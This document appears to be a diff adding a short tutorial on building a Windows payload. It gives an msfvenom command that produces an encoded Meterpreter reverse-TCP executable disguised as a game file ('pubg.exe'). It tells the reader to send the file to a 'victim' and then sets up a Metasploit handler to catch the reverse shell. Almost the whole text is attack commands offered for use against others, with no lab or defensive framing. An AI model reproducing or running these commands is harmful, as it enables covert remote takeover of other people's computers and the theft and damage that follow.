@@ -1,1 +1,30 @@
+************ CREATING A PAYLOAD FOR WINDOWS *****************
 
+ first Open terminal
+ Type 
+ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcpLHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/pubg.exe
+ 
+ And send this file in victim pc
+ 
+ *********Open terminal and type*************
+ 
+ msfconsole
+ 
+ TYPE: use exploit/multi/handler
+ 
+ 
+ Type
+ set payload windows/meterpreter/reverse_tcp
+ 
+ And we need to set your local host
+ TYPE; set lhost (your ip address)
+ TYPE; set lport (HERE)
+ 
+ 
+ TYPE; exploit
+ 
+ 
+ 
+ 
+ 
+ 
